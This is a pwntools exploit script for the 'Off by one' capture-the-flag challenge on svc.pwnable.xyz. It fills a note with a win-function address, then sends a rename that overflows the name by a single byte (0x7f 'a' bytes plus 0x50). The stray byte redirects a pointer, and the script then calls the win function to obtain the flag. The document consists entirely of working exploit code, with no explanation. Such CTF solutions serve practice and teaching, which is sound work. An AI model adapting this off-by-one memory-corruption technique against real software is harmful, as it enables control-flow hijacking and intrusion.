###Off by one

from pwn import *

###Util
def create(size,title,data):
    r.sendlineafter('> ','1')
    r.sendlineafter('size: ',str(size))
    r.sendafter('Title: ',title)
    r.sendafter('Note: ',data)

def rename(data):
    r.sendlineafter('> ','4')
    r.sendafter('name: ',data)

def get_flag():
    r.sendlineafter('> ','2')

###Addr
win = 0x40092c

###Exploit
r = remote('svc.pwnable.xyz',30035)
r.sendafter('notebook: ','M30W\n')
create(0x38,'M30W\n',p64(win).ljust(0x30,b'\x00')+p64(1))
rename(b'a'*0x7f+b'\x50')
get_flag()

r.interactive()
